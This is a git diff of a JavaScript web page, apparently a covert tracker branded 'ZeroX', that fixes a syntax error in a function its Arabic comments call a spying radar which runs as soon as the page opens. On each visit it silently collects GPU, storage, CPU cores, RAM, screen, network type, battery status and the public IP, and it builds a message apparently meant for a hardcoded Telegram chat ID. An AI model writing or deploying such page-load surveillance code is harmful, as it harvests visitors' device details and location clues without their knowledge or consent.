@@ -140,65 +140,68 @@ const chatId = "7388801889";
     
     // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
-     
-        // --- كود قنص المساحة الخاص بـ ZeroX ---
-let storageInfo = "محجوب/غير مدعوم";
-// --- كود قنص نوع المعالج الرسومي (GPU) المحدث ---
-let gpuInfo = "غير معروف";
-try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (gl) {
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
-        } else {
-            gpuInfo = gl.getParameter(gl.RENDERER); // محاولة بديلة
-        }
-    }
-} catch (e) { gpuInfo = "محجوب"; }
-if (!gpuInfo) gpuInfo = "محجوب من النظام"; 
-// -----------------------------------------
-
-} catch (e) { gpuInfo = "محجوب من المتصفح"; }
-// -----------------------------------------
-
-try {
-    if (navigator.storage && navigator.storage.estimate) {
-        const estimate = await navigator.storage.estimate();
-        const total = (estimate.quota / (1024 ** 3)).toFixed(1);
-        const free = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(1);
-        storageInfo = `${total}GB الكلية | ${free}GB الفاضية`;
-    }
-} catch (e) { storageInfo = "خطأ في الجلب"; }
-// ---------------------------------------
-
         
-        // معلومات المتصفح والنظام
-        let ua = navigator.userAgent;
-        let platform = navigator.platform;
-        let language = navigator.language;
-        let cores = navigator.hardwareConcurrency || "غير معروف"; // عدد نويات المعالج
-        let ram = navigator.deviceMemory || "غير معروف"; // الذاكرة العشوائية GB
-        let screenRes = `${window.screen.width}x${window.screen.height}`;
-        let colorDepth = window.screen.colorDepth;
-        let connection = navigator.connection ? navigator.connection.effectiveType : "غير معروف"; // نوع الشبكة (4G/WiFi)
+    // --- كود قنص المساحة الخاص بـ ZeroX ---
+    let storageInfo = "محجوب/غير مدعوم";
 
-        let batteryInfo = "غير متاح";
-        let ipAddr = "جاري الجلب...";
+    // --- كود قنص نوع المعالج الرسومي (GPU) المحدث ---
+    let gpuInfo = "غير معروف";
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
+            } else {
+                gpuInfo = gl.getParameter(gl.RENDERER); // محاولة بديلة
+            }
+        }
+    } catch (e) { 
+        gpuInfo = "محجوب من المتصفح"; 
+    }
 
-        // جلب تفاصيل البطارية (الشحن والحالة)
-        try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `🔋 المستوى: ${(battery.level * 100).toFixed(0)}% | ⚡ الحالة: ${battery.charging ? 'جاري الشحن الآن' : 'لا يشحن حالياً'}`;
-        } catch (e) {}
+    if (!gpuInfo) gpuInfo = "محجوب من النظام"; 
 
-        // جلب الـ IP
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ipAddr = data.ip;
-        } catch (e) {}
+    // --- تكملة كود المساحة ---
+    try {
+        if (navigator.storage && navigator.storage.estimate) {
+            const estimate = await navigator.storage.estimate();
+            const total = (estimate.quota / (1024 ** 3)).toFixed(1);
+            const free = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(1);
+            storageInfo = `${total}GB الكلية | ${free}GB الفاضية`;
+        }
+    } catch (e) { 
+        storageInfo = "خطأ في الجلب"; 
+    }
+    // ---------------------------------------
+
+    // معلومات المتصفح والنظام
+    let ua = navigator.userAgent;
+    let platform = navigator.platform;
+    let language = navigator.language;
+    let cores = navigator.hardwareConcurrency || "غير معروف"; // عدد نويات المعالج
+    let ram = navigator.deviceMemory || "غير معروف"; // الذاكرة العشوائية GB
+    let screenRes = `${window.screen.width}x${window.screen.height}`;
+    let colorDepth = window.screen.colorDepth;
+    let connection = navigator.connection ? navigator.connection.effectiveType : "غير معروف"; // نوع الشبكة (4G/WiFi)
+
+    let batteryInfo = "غير متاح";
+    let ipAddr = "جاري الجلب...";
+
+    // جلب تفاصيل البطارية (الشحن والحالة)
+    try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `🔋 المستوى: ${(battery.level * 100).toFixed(0)}% | ⚡ الحالة: ${battery.charging ? 'جاري الشحن الآن' : 'لا يشحن حالياً'}`;
+    } catch (e) {}
+
+    // جلب الـ IP
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ipAddr = data.ip;
+    } catch (e) {}
+
 
         const megaMsg = `
 🚨 رادار ZeroX المطور - صيد دقيق!
